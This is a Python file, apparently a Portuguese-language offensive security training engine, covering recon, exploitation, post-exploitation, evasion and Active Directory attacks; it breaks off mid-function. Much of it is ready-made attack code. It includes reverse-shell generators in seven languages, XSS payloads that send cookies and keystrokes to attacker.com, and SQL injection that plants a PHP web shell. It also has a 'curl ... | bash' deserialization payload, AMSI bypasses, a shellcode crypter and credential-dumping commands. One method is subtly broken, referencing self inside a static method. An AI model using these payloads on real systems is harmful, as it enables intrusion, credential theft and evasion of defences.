#!/usr/bin/env python3
"""
HackerAI Training Engine v3.0
Motor de IA para treinamento em segurança ofensiva e defensiva
Uso autorizado exclusivamente para profissionais de segurança autorizados
"""

import json
import random
import hashlib
import ipaddress
import socket
import struct
import base64
import re
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime

# ============================================================
# MÓDULO 1: FUNDAMENTOS - BASES DO HACKING
# ============================================================

class ModuloFundamentos:
    """Módulo básico - Conceitos fundamentais de segurança"""
    
    @staticmethod
    def aula_modelo_osi():
        return {
            "titulo": "Modelo OSI e TCP/IP - A Base de Tudo",
            "topicos": [
                "Camada Física: Cabos, sinais elétricos, fibra óptica",
                "Camada de Enlace: MAC addresses, switches, ARP spoofing",
                "Camada de Rede: IP, roteamento, ICMP, traceroute",
                "Camada de Transporte: TCP (3-way handshake), UDP",
                "Camada de Sessão: Sessões NetBIOS, SMB",
                "Camada de Apresentação: SSL/TLS, codificação",
                "Camada de Aplicação: HTTP, DNS, FTP, SMTP"
            ],
            "exercicio": {
                "pergunta": "Analise este pacote TCP e identifique os flags: 0x012",
                "resposta": "SYN (0x02) + ACK (0x10) = 0x12 - Confirmação de SYN",
                "pratico": "Use tcpdump para capturar handshake TCP completo"
            }
        }
    
    @staticmethod
    def aula_sistemas_operacionais():
        return {
            "titulo": "Sistemas Operacionais - Alvo e Ferramenta",
            "topicos": [
                "Linux: /etc/passwd, /etc/shadow, permissões SUID",
                "Windows: SAM, LSASS, tokens de acesso, UAC",
                "Processos, threads, chamadas de sistema (syscalls)",
                "Gerenciamento de memória, heap, stack, ASLR"
            ],
            "comandos_essenciais": {
                "linux": ["nmap", "netcat", "tcpdump", "grep", "awk", "find", "chmod"],
                "windows": ["netstat", "tasklist", "whoami", "powershell", "reg"]
            }
        }

# ============================================================
# MÓDULO 2: RECONHECIMENTO E FOOTPRINTING
# ============================================================

class ModuloReconhecimento:
    """Técnicas de reconhecimento passivo e ativo"""
    
    @staticmethod
    def aula_osint():
        return {
            "titulo": "OSINT - Inteligência de Fontes Abertas",
            "ferramentas": [
                {"nome": "theHarvester", "uso": "Coleta de emails, subdomínios, IPs"},
                {"nome": "Shodan", "uso": "Busca por dispositivos conectados"},
                {"nome": "Google Dorks", "uso": "Operadores avançados de busca"},
                {"nome": "Maltego", "uso": "Mapeamento de relações e entidades"},
                {"nome": "Recon-ng", "uso": "Framework completo de recon"}
            ],
            "google_dorks": [
                "site:alvo.com filetype:pdf",
                "intitle:'index of' 'backup'",
                "inurl:wp-content/uploads",
                "site:github.com 'senha' 'alvo'"
            ],
            "exercicio_pratico": "Realize recon passivo no domínio exemplo.com usando whois, dig e theHarvester"
        }
    
    @staticmethod
    def aula_varredura_redes():
        return {
            "titulo": "Varredura de Redes com Nmap",
            "tecnicas": [
                {"nome": "SYN Scan (-sS)", "descricao": "Meio handshake, rápido e furtivo"},
                {"nome": "TCP Connect (-sT)", "descricao": "Handshake completo, mais ruidoso"},
                {"nome": "UDP Scan (-sU)", "descricao": "Lento, mas essencial para serviços UDP"},
                {"nome": "Ping Sweep (-sn)", "descricao": "Descoberta de hosts ativos"},
                {"nome": "Version Detection (-sV)", "descricao": "Identificação de versões de serviços"},
                {"nome": "OS Detection (-O)", "descricao": "Fingerprint de sistema operacional"},
                {"nome": "NSE Scripts (--script)", "descricao": "Automação de vulnerabilidades"}
            ],
            "comandos_exemplo": [
                "nmap -sS -sV -O -p- 192.168.1.0/24",
                "nmap -sU --top-ports 100 10.0.0.1",
                "nmap --script vuln 192.168.1.100"
            ]
        }

# ============================================================
# MÓDULO 3: EXPLORAÇÃO DE VULNERABILIDADES
# ============================================================

class ModuloExploracao:
    """Motor de exploração de vulnerabilidades"""
    
    @staticmethod
    def gerar_payload_sql_injection(tipo: str = "union") -> str:
        """Gera payloads de SQL Injection"""
        payloads = {
            "basic": "' OR '1'='1",
            "union": "' UNION SELECT 1,2,3,4,5--",
            "blind": "' AND SLEEP(5)--",
            "error": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
            "time": "'; WAITFOR DELAY '0:0:5'--",
            "stacked": "'; DROP TABLE users;--",
            "outfile": "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]);?>',3 INTO OUTFILE '/var/www/shell.php'--"
        }
        return payloads.get(tipo, payloads["basic"])
    
    @staticmethod
    def gerar_payload_xss(tipo: str = "reflected") -> Dict:
        """Gera payloads de Cross-Site Scripting"""
        payloads = {
            "basic": "<script>alert('XSS')</script>",
            "steal_cookie": "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
            "keylogger": """<script>
                document.addEventListener('keydown', function(e) {
                    fetch('http://attacker.com/k?k='+e.key);
                });
            </script>""",
            "phishing": """<script>
                document.body.innerHTML = '<form action="http://attacker.com/login" method="POST">' +
                    '<input name="user"><input name="pass" type="password">' +
                    '<input type="submit"></form>';
            </script>""",
            "dom_based": "#<img src=x onerror=alert(1)>",
            "blind": "<script>new Image().src='http://attacker.com/beacon/'+btoa(document.cookie)</script>"
        }
        return {
            "payload": payloads.get(tipo, payloads["basic"]),
            "contexto": f"Tipo: {tipo}",
            "bypass_waf": self._sugerir_bypass_waf(tipo)
        }
    
    @staticmethod
    def _sugerir_bypass_waf(tipo: str) -> List[str]:
        bypasses = {
            "reflected": [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<script/random>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)//"
            ],
            "stored": [
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                "<scr<script>ipt>alert(1)</scr</script>ipt>"
            ]
        }
        return bypasses.get(tipo, bypasses["reflected"])
    
    @staticmethod
    def gerar_reverse_shell(ip: str, porta: int, linguagem: str = "python") -> str:
        """Gera código de reverse shell para diversas linguagens"""
        shells = {
            "bash": f"bash -i >& /dev/tcp/{ip}/{porta} 0>&1",
            "python": f"""python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{porta}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'""",
            "php": f"""php -r '$sock=fsockopen("{ip}",{porta});exec("/bin/sh -i <&3 >&3 2>&3");'""",
            "nc": f"nc -e /bin/sh {ip} {porta}",
            "powershell": f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{porta});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"""",
            "perl": f"""perl -e 'use Socket;$i="{ip}";$p={porta};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}'""",
            "ruby": f"""ruby -rsocket -e 'c=TCPSocket.new("{ip}",{porta});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"""
        }
        return shells.get(linguagem, shells["python"])

# ============================================================
# MÓDULO 4: ENGENHARIA SOCIAL
# ============================================================

class ModuloEngenhariaSocial:
    """Técnicas de engenharia social para treinamento"""
    
    @staticmethod
    def aula_phishing():
        return {
            "titulo": "Phishing - A Ameaça Mais Eficaz",
            "tecnicas": [
                "Spear Phishing: Alvo específico com informações personalizadas",
                "Whaling: Executivos de alto escalão",
                "Clone Phishing: Cópia de email legítimo com link malicioso",
                "Vishing: Phishing por chamada telefônica",
                "Smishing: Phishing via SMS"
            ],
            "exemplo_email_malicioso": {
                "de": "suporte@banco-seguro.com",
                "para": "funcionario@empresa.com",
                "assunto": "URGENTE: Atualização de Segurança Necessária",
                "corpo": "Prezado cliente,\n\nDetectamos atividade suspeita em sua conta. Clique no link abaixo para verificar:\nhttp://banco-seguro.com/verificar (link real: http://192.168.1.100/roubo)\n\nAtenciosamente,\nEquipe de Segurança"
            },
            "defesa": [
                "Verificar remetente cuidadosamente",
                "Nunca clicar em links suspeitos",
                "Autenticação de dois fatores (2FA)",
                "Treinamento contínuo de conscientização"
            ]
        }
    
    @staticmethod
    def aula_pretexting():
        return {
            "titulo": "Pretexting - Criação de Cenários Falsos",
            "cenarios": [
                "Falso técnico de TI solicitando senha",
                "Falso fornecedor pedindo pagamento",
                "Falso CEO solicitando transferência urgente",
                "Falso recrutador coletando informações"
            ],
            "defesa": "Sempre verificar identidade por canal alternativo"
        }

# ============================================================
# MÓDULO 5: PÓS-EXPLORAÇÃO E MOVIMENTAÇÃO LATERAL
# ============================================================

class ModuloPosExploracao:
    """Técnicas após obter acesso inicial"""
    
    @staticmethod
    def aula_privilege_escalation_linux():
        return {
            "titulo": "Escalação de Privilégio Linux",
            "tecnicas": [
                {"nome": "SUID Binaries", "comando": "find / -perm -4000 2>/dev/null"},
                {"nome": "Sudo -l", "comando": "sudo -l"},
                {"nome": "Kernel Exploits", "comando": "uname -a && searchsploit linux kernel"},
                {"nome": "Cron Jobs", "comando": "cat /etc/crontab"},
                {"nome": "Capabilities", "comando": "getcap -r / 2>/dev/null"},
                {"nome": "Docker Escape", "comando": "docker run -v /:/mnt -it alpine chroot /mnt /bin/sh"},
                {"nome": "LXD/LXC", "comando": "lxd init && lxc launch ubuntu:18.04 -c security.privileged=true"}
            ],
            "scripts_automacao": [
                "LinPEAS: https://github.com/carlospolop/PEASS-ng",
                "LinEnum: https://github.com/rebootuser/LinEnum",
                "GTFOBins: https://gtfobins.github.io/"
            ]
        }
    
    @staticmethod
    def aula_privilege_escalation_windows():
        return {
            "titulo": "Escalação de Privilégio Windows",
            "tecnicas": [
                {"nome": "AlwaysInstallElevated", "comando": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"},
                {"nome": "Unquoted Service Paths", "comando": "wmic service get name,displayname,pathname,startmode | findstr /i 'Auto' | findstr /i /v 'C:\\Windows\\'"},
                {"nome": "Weak Service Permissions", "comando": "sc qc servicename"},
                {"nome": "Token Impersonation", "comando": "JuicyPotato / SeImpersonatePrivilege"},
                {"nome": "DLL Hijacking", "comando": "Process Monitor para identificar DLLs faltantes"},
                {"nome": "SAM Dump", "comando": "reg save hklm\\sam sam.save && reg save hklm\\system system.save"}
            ],
            "scripts": [
                "WinPEAS: https://github.com/carlospolop/PEASS-ng",
                "PowerUp: https://github.com/PowerShellMafia/PowerSploit",
                "SharpUp: https://github.com/GhostPack/SharpUp"
            ]
        }
    
    @staticmethod
    def aula_movimentacao_lateral():
        return {
            "titulo": "Movimentação Lateral em Redes",
            "tecnicas": [
                {"nome": "Pass-the-Hash", "ferramenta": "pth-winexe ou impacket-psexec"},
                {"nome": "Pass-the-Ticket", "ferramenta": "Mimikatz + Rubeus"},
                {"nome": "PSExec", "comando": "impacket-psexec dominio/usuario:senha@192.168.1.50"},
                {"nome": "WMI", "comando": "wmic /node:192.168.1.50 process call create 'cmd.exe /c calc.exe'"},
                {"nome": "WinRM", "comando": "evil-winrm -i 192.168.1.50 -u usuario -p senha"},
                {"nome": "SSH Tunneling", "comando": "ssh -L 8080:target:80 user@jumpbox"},
                {"nome": "SMB Exec", "comando": "impacket-smbexec dominio/usuario:senha@192.168.1.50"}
            ],
            "ferramentas_chave": [
                "CrackMapExec: enumeração e execução em massa",
                "BloodHound: mapeamento de relações AD",
                "Impacket: suíte de ferramentas para protocolos Windows"
            ]
        }

# ============================================================
# MÓDULO 6: WEB HACKING AVANÇADO
# ============================================================

class ModuloWebAvancado:
    """Técnicas avançadas de hacking web"""
    
    @staticmethod
    def aula_ssrf():
        return {
            "titulo": "Server-Side Request Forgery (SSRF)",
            "tecnicas": [
                "Bypass de restrições de IP: 127.0.0.1, localhost, [::1], 0.0.0.0",
                "DNS Rebinding: domínio que alterna entre IPs",
                "Protocolos: file://, dict://, gopher://, ftp://",
                "Cloud Metadata: http://169.254.169.254/latest/meta-data/"
            ],
            "payloads": [
                "http://127.0.0.1:8080/admin",
                "file:///etc/passwd",
                "gopher://localhost:6379/_*2%0d%0a$4%0d%0aPING%0d%0a",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            ]
        }
    
    @staticmethod
    def aula_deserializacao():
        return {
            "titulo": "Ataques de Desserialização",
            "linguagens_afetadas": ["PHP", "Java", "Python (pickle)", "Ruby", ".NET"],
            "exemplo_php": {
                "codigo_vulneravel": 'unserialize($_GET["data"]);',
                "payload": 'O:7:"Exploit":1:{s:4:"cmd";s:10:"id";}',
                "gadget_chains": "PHPGGC para gerar payloads de frameworks"
            },
            "exemplo_java": {
                "ferramentas": ["ysoserial", "marshalsec"],
                "comando": "java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh | bash'"
            },
            "defesa": [
                "Nunca desserializar dados não confiáveis",
                "Usar HMAC para validar integridade",
                "Implementar allowlist de classes"
            ]
        }
    
    @staticmethod
    def aula_graphql():
        return {
            "titulo": "Ataques a APIs GraphQL",
            "tecnicas": [
                "Introspection: query { __schema { types { name fields { name } } } }",
                "Batching Attack: múltiplas queries em uma requisição",
                "SQL Injection em resolvers",
                "Authorization bypass via aliases"
            ],
            "ferramentas": ["GraphQL Voyager", "InQL Scanner", "graphql-map"]
        }

# ============================================================
# MÓDULO 7: CLOUD E CONTAINERS
# ============================================================

class ModuloCloud:
    """Segurança em ambientes cloud e containers"""
    
    @staticmethod
    def aula_aws_enum():
        return {
            "titulo": "Enumeração AWS",
            "servicos_chave": [
                "S3: Buckets públicos, listagem de objetos",
                "IAM: Políticas excessivamente permissivas",
                "EC2: Security groups abertos, metadados",
                "Lambda: Funções com permissões elevadas",
                "RDS: Bancos expostos publicamente"
            ],
            "ferramentas": ["awscli", "pacu", "ScoutSuite", "CloudSploit"],
            "comandos": [
                "aws s3 ls s3://bucket-name --no-sign-request",
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "aws iam list-attached-user-policies --user-name admin"
            ]
        }
    
    @staticmethod
    def aula_docker_security():
        return {
            "titulo": "Segurança em Docker",
            "ataques": [
                "Container Escape: --privileged, --cap-add=SYS_ADMIN",
                "Host Mount: docker run -v /:/host",
                "Registry Attacks: imagens maliciosas no Docker Hub",
                "Network Attacks: containers na mesma rede"
            ],
            "defesa": [
                "Usar usuário não-root no container",
                "Read-only filesystem",
                "Resource limits (--memory, --cpus)",
                "Image scanning (Trivy, Clair)"
            ]
        }

# ============================================================
# MÓDULO 8: ENGENHARIA REVERSA E BINARY EXPLOITATION
# ============================================================

class ModuloBinaryExploitation:
    """Exploração de binários e engenharia reversa"""
    
    @staticmethod
    def aula_buffer_overflow():
        return {
            "titulo": "Buffer Overflow Clássico",
            "conceitos": [
                "Stack layout: variáveis locais, EBP, EIP/RIP",
                "Offset calculation: pattern create/offset",
                "Shellcode injection: NOP sled + shellcode + ret",
                "ASLR bypass: ret2plt, ret2libc, ROP",
                "NX bypass: ROP chains, mprotect",
                "Stack canaries: leak + brute force"
            ],
            "ferramentas": ["gdb", "pwntools", "radare2", "ghidra", "ida"],
            "exemplo_pwntools": """from pwn import *

# Conectar ao alvo
p = remote('target.com', 1337)

# Encontrar offset
payload = cyclic(100)
p.sendline(payload)
p.wait()
core = p.corefile
offset = cyclic_find(core.fault_addr)

# Construir exploit
jmp_esp = 0x080414c3  # Endereço de JMP ESP
shellcode = asm(shellcraft.sh())

payload = b'A' * offset
payload += p32(jmp_esp)
payload += b'\\x90' * 16  # NOP sled
payload += shellcode

p.sendline(payload)
p.interactive()"""
        }
    
    @staticmethod
    def aula_rop():
        return {
            "titulo": "Return-Oriented Programming (ROP)",
            "conceitos": [
                "Gadgets: sequências de instruções terminando em ret",
                "ROPgadget: ferramenta para encontrar gadgets",
                "ROP chain: encadeamento de gadgets",
                "ret2libc: chamar system('/bin/sh')",
                "ret2plt: chamar funções da PLT"
            ],
            "comando_ropgadget": "ROPgadget --binary /bin/ls | grep 'pop rdi'"
        }

# ============================================================
# MÓDULO 9: WIRELESS E IoT
# ============================================================

class ModuloWireless:
    """Ataques a redes sem fio e IoT"""
    
    @staticmethod
    def aula_wifi():
        return {
            "titulo": "Hacking de Redes Wi-Fi",
            "ataques": [
                {"nome": "WPA2 Handshake Capture", "ferramenta": "airodump-ng + aircrack-ng"},
                {"nome": "WPA3 Downgrade Attack", "ferramenta": "hashcat + dragonblood"},
                {"nome": "Evil Twin", "ferramenta": "airbase-ng + dnsmasq"},
                {"nome": "Deauth Attack", "comando": "aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0"},
                {"nome": "PMKID Attack", "ferramenta": "hcxdumptool + hcxpcaptool"},
                {"nome": "WPS PIN Brute Force", "ferramenta": "reaver / bully"}
            ],
            "comandos": [
                "airmon-ng start wlan0",
                "airodump-ng wlan0mon",
                "airodump-ng -c 6 --bssid AP_MAC -w capture wlan0mon",
                "aireplay-ng -0 5 -a AP_MAC wlan0mon",
                "aircrack-ng -w wordlist.txt capture-01.cap"
            ]
        }
    
    @staticmethod
    def aula_bluetooth():
        return {
            "titulo": "Bluetooth Hacking",
            "ferramentas": ["bluez", "bluetoothctl", "hcitool", "bettercap"],
            "ataques": [
                "BlueBorne: execução remota via Bluetooth",
                "Bluesnarfing: roubo de dados via OBEX",
                "Bluejacking: envio de mensagens não solicitadas",
                "BLE Spoofing: falsificação de dispositivos BLE"
            ]
        }

# ============================================================
# MÓDULO 10: DEFESA E DETECÇÃO
# ============================================================

class ModuloDefesa:
    """Técnicas defensivas e detecção"""
    
    @staticmethod
    def aula_deteccao_intrusao():
        return {
            "titulo": "Sistemas de Detecção de Intrusão (IDS/IPS)",
            "ferramentas": [
                {"nome": "Snort", "tipo": "Network-based IDS"},
                {"nome": "Suricata", "tipo": "Network-based IDS/IPS"},
                {"nome": "Zeek (Bro)", "tipo": "Network Analysis Framework"},
                {"nome": "OSSEC", "tipo": "Host-based IDS"},
                {"nome": "Wazuh", "tipo": "SIEM + HIDS"},
                {"nome": "YARA", "tipo": "Malware Identification"}
            ],
            "regras_snort": [
                "alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:'SSH Brute Force'; flow:to_server; detection_filter:track by_src, count 5, seconds 30; sid:1000001;)",
                "alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:'Reverse Shell Detected'; sid:1000002;)"
            ]
        }
    
    @staticmethod
    def aula_hardening():
        return {
            "titulo": "Hardening de Sistemas",
            "linux": [
                "Desabilitar root login SSH: PermitRootLogin no",
                "Fail2Ban: proteção contra brute force",
                "AppArmor/SELinux: mandatory access control",
                "Kernel hardening: sysctl -w kernel.randomize_va_space=2",
                "Auditd: monitoramento de chamadas de sistema",
                "Desabilitar serviços desnecessários"
            ],
            "windows": [
                "LAPS: gerenciamento de senhas locais",
                "AppLocker: whitelisting de aplicações",
                "Windows Defender: ATP e EDR",
                "BitLocker: criptografia de disco",
                "Group Policy: configurações de segurança"
            ],
            "checklist": [
                "Senhas fortes e políticas de expiração",
                "Atualizações regulares de segurança",
                "Firewall configurado corretamente",
                "Backup regular e testado",
                "Monitoramento contínuo",
                "Princípio do menor privilégio"
            ]
        }

# ============================================================
# MÓDULO 11: EVASÃO DE DEFESAS
# ============================================================

class ModuloEvasao:
    """Técnicas de evasão de AV/EDR/AMSI"""
    
    @staticmethod
    def aula_amsi_bypass():
        return {
            "titulo": "Bypass de AMSI (Windows)",
            "tecnicas": [
                {"nome": "Memory Patching", "descricao": "Patch na função AmsiScanBuffer"},
                {"nome": "Registry", "comando": "reg add HKCU\\Software\\Microsoft\\Windows Script\\Settings /v AmsiEnable /t REG_DWORD /d 0 /f"},
                {"nome": "Reflection", "codigo": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"},
                {"nome": "Forcing Errors", "codigo": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$f.SetValue($null,[IntPtr]::Zero)"}
            ]
        }
    
    @staticmethod
    def aula_packer_crypter():
        return {
            "titulo": "Empacotamento e Criptografia de Payloads",
            "tecnicas": [
                "XOR Encryption: simples mas eficaz contra assinaturas",
                "AES Encryption: criptografia forte do payload",
                "Base64 Encoding: ofuscação básica",
                "Shellcode Injection: alocação + execução em memória",
                "Process Hollowing: substituir processo legítimo",
                "DLL Injection: carregar DLL maliciosa em processo"
            ],
            "exemplo_xor": """def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

shellcode = b"\\xfc\\x48\\x83\\xe4..."
key = b"secret"
encrypted = xor_encrypt(shellcode, key)
print(base64.b64encode(encrypted).decode())"""
        }

# ============================================================
# MÓDULO 12: ACTIVE DIRECTORY
# ============================================================

class ModuloActiveDirectory:
    """Ataques e defesas em Active Directory"""
    
    @staticmethod
    def aula_ad_ataques():
        return {
            "titulo": "Active Directory - O Coração da Rede Corporativa",
            "ataques": [
                {"nome": "Kerberoasting", "descricao": "Solicitar TGS e quebrar offline", "comando": "impacket-GetUserSPNs -request -dc-ip 10.0.0.1 dominio.com/usuario"},
                {"nome": "AS-REP Roasting", "descricao": "Usuários sem pré-autenticação Kerberos", "comando": "impacket-GetNPUsers -dc-ip 10.0.0.1 -no-pass dominio.com/"},
                {"nome": "Golden Ticket", "descricao": "Forjar TGT com KRBTGT hash", "comando": "mimikatz 'kerberos::golden /domain:dominio.com /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /id:500 /ptt'"},
                {"nome": "Silver Ticket", "descricao": "Forjar TGS para serviço específico"},
                {"nome": "DCSync", "descricao": "Replicar hashes do DC", "comando": "impacket-secretsdump -just-dc dominio.com/admin:senha@10.0.0.1"},
                {"nome": "ACL Abuse", "descricao": "Abusar de permissões delegadas"},
                {"nome": "NTLM Relay", "descricao": "Relay de autenticação NTLM"}
            ],
            "ferramentas": ["BloodHound", "Impacket", "Mimikatz", "Rubeus", "CrackMapExec"]
        }
    
    @staticmethod
    def aula_ad_defesa():
        return {
            "titulo": "Defesa de Active Directory",
            "medidas": [
                "Contas de serviço com senhas complexas e rotação",
                "Monitorar Kerberos TGS requests anormais",
                "Desabilitar contas com pré-autenticação desativada",
                "Proteger conta KRBTGT com rotação regular",
                "Implementar Protected Users Group",
                "Auditar permissões delegadas regularmente",
                "Deception: contas honeypot no AD"
            ]
        }

# ============================================================
# MÓDULO 13: CRYPTOGRAFIA E HASHES
# ============================================================

class ModuloCriptografia:
    """Criptografia aplicada à segurança ofensiva"""
    
    @staticmethod
    def aula_hash_cracking():
        return {
            "titulo": "Quebra de Hashes",
            "ferramentas": ["hashcat", "john", "hash-identifier"],
            "modos_hashcat": [
                {"modo": 1000, "tipo": "NTLM"},
                {"modo": 5600, "tipo": "NetNTLMv2"},
                {"modo": 13100, "tipo": "Kerberos 5 TGS-REP"},
                {"modo": 18200, "tipo": "Kerberos 5 AS-REP"},
                {"modo": 2100, "tipo": "Domain Cached Credentials (DCC2)"},
                {"modo": 3200, "tipo": "bcrypt"},
                {"modo": 1800, "tipo": "SHA-512 (Unix)"}
            ],
            "comandos": [
                "hashcat -m 1000 -a 0 hashes.txt wordlist.txt",
                "hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d",
                "hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l?l?l",
                "hashcat -m 1000 --show hashes.txt"
            ],
            "regras_eficientes": [
                "best64.rule",
                "d3ad0ne.rule",
                "OneRuleToRuleThemAll.rule",
                "rockyou-30000.rule"
            ]
        }

# ============================================================
# MÓDULO 14: AUTOMAÇÃO E FERRAMENTAS CUSTOMIZADAS
# ============================================================

class ModuloAutomacao:
    """Criação de ferramentas de automação para pentest"""
    
    @staticmethod
    def criar_scanner_portas():
        return """#!/usr/bin/env python3
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = 'unknown'
            return port, service, 'OPEN'
        return None
    except:
        return None

def main():
    host = sys.argv[1]
    ports = range(1, 1025) if len(sys.argv) < 3 else range(int(sys.argv[2]), int(sys.argv[3]) + 1)
    
    print(f"Scanning {host}...")
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        for future in futures:
            result = future.result()
            if result:
                port, service, status = result
                print(f"Port {port}/{service}: {status}")

if __name__ == '__main__':
    main()"""
    
    @staticmethod
    def criar_web_fuzzer():
        return """#!/usr/bin/env python3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

def fuzz_directory(base_url, word):
    url = f"{base_url}/{word}"
    try:
        r = requests.get(url, timeout=3, allow_redirects=False)
        if r.status_code in [200, 301, 302, 403, 401]:
            return url, r.status_code, len(r.content)
    except:
        pass
    return None

def main():
    base_url = sys.argv[1]
    wordlist = sys.argv[2]
    
    with open(wordlist, 'r') as f:
        words = [line.strip() for line in f if line.strip()]
    
    print(f"Fuzzing {base_url} with {len(words)} words...")
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(fuzz_directory, base_url, word): word for word in words}
        for future in futures:
            result = future.result()
            if result:
                url, status, size = result
                print(f"[{status}] {url} (Size: {size})")

if __name__ == '__main__':
    main()"""

# ============================================================
# MÓDULO 15: CAPTURE THE FLAG (CTF) - PRÁTICA
# ============================================================

class ModuloCTF:
    """Desafios práticos estilo CTF"""
    
    @staticmethod
    def gerar_desafio(nivel: str = "facil") -> Dict:
        """Gera desafios CTF para prática"""
        desafios = {
            "facil": {
                "nome": "Flag Escondida",
                "descricao": "Encontre a flag escondida no código fonte da página",
                "dica": "View page source (Ctrl+U)",
                "flag": "CTF{view_source_is_easy}"
            },
            "medio": {
                "nome": "SQL Injection Login Bypass",
                "descricao": "Bypasse o login usando SQL Injection",
                "dica": "Tente: ' OR '1'='1",
                "flag": "CTF{sql_injection_master}"
            },
            "dificil": {
                "nome": "Reverse Shell Challenge",
                "descricao": "Obtenha uma reverse shell no servidor e encontre a flag em /root/flag.txt",
                "dica": "Upload de shell PHP + netcat listener",
                "flag": "CTF{reverse_shell_achieved}"
            }
        }
        return desafios.get(nivel, desafios["facil"])

# ============================================================
# MOTOR PRINCIPAL - HackerAI Training Engine
# ============================================================

class HackerAITrainingEngine:
    """Motor principal de treinamento HackerAI"""
    
    def __init__(self):
        self.modulos = {
            "1": {"nome": "Fundamentos", "aulas": ModuloFundamentos()},
            "2": {"nome": "Reconhecimento", "aulas": ModuloReconhecimento()},
            "3": {"nome": "Exploração", "aulas": ModuloExploracao()},
            "4": {"nome": "Engenharia Social", "aulas": ModuloEngenhariaSocial()},
            "5": {"nome": "Pós-Exploração", "aulas": ModuloPosExploracao()},
            "6": {"nome": "Web Avançado", "aulas": ModuloWebAvancado()},
            "7": {"nome": "Cloud & Containers", "aulas": ModuloCloud()},
            "8": {"nome": "Binary Exploitation", "aulas": ModuloBinaryExploitation()},
            "9": {"nome": "Wireless & IoT", "aulas": ModuloWireless()},
            "10": {"nome": "Defesa & Detecção", "aulas": ModuloDefesa()},
            "11": {"nome": "Evasão", "aulas": ModuloEvasao()},
            "12": {"nome": "Active Directory", "aulas": ModuloActiveDirectory()},
            "13": {"nome": "Criptografia", "aulas": ModuloCriptografia()},
            "14": {"nome": "Automação", "aulas": ModuloAutomacao()},
            "15": {"nome": "CTF Prático", "aulas": ModuloCTF()}
        }
        
        self.trilhas = {
            "iniciante": ["1", "2", "4"],
            "intermediario": ["3", "5", "6", "9", "13"],
            "avancado": ["7", "8", "11", "12"],
            "defesa": ["10", "12"],
            "web": ["2", "3", "6"],
            "redteam": ["3", "5", "11", "12"],
            "blueteam": ["10", "12", "13"]
        }
    
    def listar_modulos(self):
        """Lista todos os módulos disponíveis"""
        print("=" * 60)
        print("HACKERAI TRAINING ENGINE - MÓDULOS DISPONÍVEIS")
        print("=" * 60)
        for num, modulo in self.modulos.items():
            print(f"  [{num}] {modulo['nome']}")
        print("=" * 60)
    
    def listar_trilhas(self):
        """Lista trilhas de aprendizado"""
        print("\n" + "=" * 60)
        print("TRILHAS DE APRENDIZADO RECOMENDADAS")
        print("=" * 60)
        for nome, modulos in self.trilhas.items():
            mods = [self.modulos[m]['nome'] for m in modulos]
            print(f"  [{nome.upper()}] {' -> '.join(mods)}")
        print("=" * 60)
    
    def executar_modulo(self, num_modulo: str):
        """Executa um módulo específico"""
        if num_modulo in self.modulos:
            modulo = self.modulos[num_modulo]
            print(f"\n{'='*60}")
            print(f"MÓDULO {num_modulo}: {modulo['nome']}")
            print(f"{'='*60}")
            
            # Executa aulas específicas baseadas no módulo
            if num_modulo == "1":
                print(json.dumps(modulo['aulas'].aula_modelo_osi(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_sistemas_operacionais(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "2":
                print(json.dumps(modulo['aulas'].aula_osint(), indent=2, ensure_ascii=False))
                print("\n---\n")
                print(json.dumps(modulo['aulas'].aula_varredura_redes(), indent=2, ensure_ascii=False))
            
            elif num_modulo == "3":
                print("=== SQL INJECTION ===")
